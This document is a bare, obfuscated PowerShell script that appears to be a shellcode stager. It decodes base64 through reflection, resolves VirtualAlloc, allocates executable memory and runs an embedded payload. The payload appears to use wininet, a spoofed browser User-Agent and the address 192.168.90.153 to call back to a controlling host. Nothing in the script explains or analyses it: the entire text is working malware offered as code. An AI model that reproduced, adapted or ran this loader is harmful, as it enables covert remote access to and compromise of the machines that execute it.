Set-StrictMode -Version 2

function fuc {
	return [System.Text.Encoding]::ASCII.GetString([convert].GetMethod("FromBase64String",[type[]]@('string')).Invoke($null,$args[0]));
}
function fuc1 {
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @("kernel32.dll")))), "VirtualAlloc"))
}
function fuc2 {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)	
	$text = fuc JHZhcl90eXBlX2J1aWxkZXIgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoKE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpKSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKS5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQoJJHZhcl90eXBlX2J1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkdmFyX3BhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQoJJHZhcl90eXBlX2J1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkdmFyX3JldHVybl90eXBlLCAkdmFyX3BhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQ==
	
	IEX($text)
	return $var_type_builder.CreateType()
}
If ([IntPtr]::size -eq 8) {
	$str = fuc L0VpRDVQRG95QUFBQUVGUlFWQlNVVlpJTWRKbFNJdFNZRWlMVWhoSWkxSWdTSXR5VUVnUHQwcEtUVEhKU0RIQXJEeGhmQUlzSUVIQnlRMUJBY0hpN1ZKQlVVaUxVaUNMUWp4SUFkQm1nWGdZQ3dKMWNvdUFpQUFBQUVpRndIUm5TQUhRVUl0SUdFU0xRQ0JKQWREalZrai95VUdMTkloSUFkWk5NY2xJTWNDc1FjSEpEVUVCd1RqZ2RmRk1BMHdrQ0VVNTBYWFlXRVNMUUNSSkFkQm1RWXNNU0VTTFFCeEpBZEJCaXdTSVNBSFFRVmhCV0Y1WldrRllRVmxCV2tpRDdDQkJVdi9nV0VGWldraUxFdWxQLy8vL1hXb0FTYjUzYVc1cGJtVjBBRUZXU1lubVRJbnhRYnBNZHlZSC85VklNY2xJTWRKTk1jQk5NY2xCVUVGUVFibzZWbm1uLzlYcmMxcElpY0ZCdURXQ0FBQk5NY2xCVVVGUmFnTkJVVUc2VjRtZnh2L1Y2MWxiU0luQlNESFNTWW5ZVFRISlVtZ0FBa0NFVWxKQnV1dFZManYvMVVpSnhraUR3MUJxQ2w5SWlmRklpZHBKeDhELy8vLy9UVEhKVWxKQnVpMEdHSHYvMVlYQUQ0V2RBUUFBU1AvUEQ0U01BUUFBNjlQcDVBRUFBT2lpLy8vL0wwVnpXVXdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCVmMyVnlMVUZuWlc1ME9pQk5iM3BwYkd4aEx6VXVNQ0FvWTI5dGNHRjBhV0pzWlRzZ1RWTkpSU0E1TGpBN0lGZHBibVJ2ZDNNZ1RsUWdOaTR4T3lCWGFXNDJORHNnZURZME95QlVjbWxrWlc1MEx6VXVNRHNnVFVGQlZUc2dUbEF3T0NrTkNnQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUWI3d3RhSlcvOVZJTWNtNkFBQkFBRUc0QUJBQUFFRzVRQUFBQUVHNldLUlQ1Zi9WU0pOVFUwaUo1MGlKOFVpSjJrRzRBQ0FBQUVtSitVRzZFcGFKNHYvVlNJUEVJSVhBZExabWl3ZElBY09Gd0hYWFdGaFlTQVVBQUFBQVVNUG9uLzMvL3pFNU1pNHhOamd1T1RBdU1UVXpBQUFBQUFBPQ==
	[Byte[]]$var_code = [convert].GetMethod("FromBase64String",[type[]]@('string')).Invoke($null,$str) 
	$var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((fuc1 ), (fuc2 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var_code.Length,0x3000, 0x40);
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length);
	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (fuc2 @([IntPtr]) ([Void]))).Invoke([IntPtr]::Zero);
}
else {
	IEX $DoIt
}

